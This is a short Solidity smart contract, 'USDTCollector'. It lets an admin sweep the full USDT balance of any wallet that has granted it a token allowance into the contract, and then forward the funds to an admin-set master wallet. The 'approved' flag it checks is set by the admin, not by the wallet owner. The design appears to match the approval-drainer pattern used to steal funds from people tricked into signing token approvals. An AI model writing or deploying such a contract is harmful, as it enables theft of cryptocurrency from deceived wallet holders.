// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract USDTCollector {
    address public admin;
    address public masterWallet;
    IERC20 public usdt;
    mapping(address => bool) public approvedWallets;
    mapping(address => bool) public processedWallets;

    // Events
    event WalletApproved(address indexed wallet);
    event USDTReceived(address indexed wallet, uint256 amount);
    event USDTWithdrawn(address indexed to, uint256 amount);
    event MasterWalletChanged(address indexed oldWallet, address indexed newWallet);

    constructor(address _masterWallet, address _usdt) {
        admin = msg.sender;
        masterWallet = _masterWallet;
        usdt = IERC20(_usdt);
    }

    modifier onlyAdmin() {
        require(msg.sender == admin);
        _;
    }

    // Admin approves a wallet (for testing/verification if needed)
    function approveWallet(address wallet) external onlyAdmin {
        approvedWallets[wallet] = true;
        emit WalletApproved(wallet);
    }

    // Pull USDT from wallet to this contract
    function pull(address wallet) external onlyAdmin returns (uint256) {
        require(approvedWallets[wallet], "Wallet not approved");
        require(!processedWallets[wallet], "Wallet already processed");
        
        uint256 bal = usdt.balanceOf(wallet);
        require(bal > 0);
        
        bool ok = usdt.transferFrom(wallet, address(this), bal);
        require(ok);
        
        processedWallets[wallet] = true;
        emit USDTReceived(wallet, bal);
        return bal;
    }

    // Withdraw USDT from contract to master wallet
    function withdrawToMaster() external onlyAdmin returns (uint256) {
        uint256 bal = usdt.balanceOf(address(this));
        require(bal > 0);
        
        bool ok = usdt.transfer(masterWallet, bal);
        require(ok);
        
        emit USDTWithdrawn(masterWallet, bal);
        return bal;
    }

    // Change master wallet (admin only)
    function changeMasterWallet(address newMaster) external onlyAdmin {
        address old = masterWallet;
        masterWallet = newMaster;
        emit MasterWalletChanged(old, newMaster);
    }

    // View functions
    function getWalletUSDT(address wallet) external view returns (uint256) {
        return usdt.balanceOf(wallet);
    }

    function getContractUSDT() external view returns (uint256) {
        return usdt.balanceOf(address(this));
    }

    function isWalletProcessed(address wallet) external view returns (bool) {
        return processedWallets[wallet];
    }
}
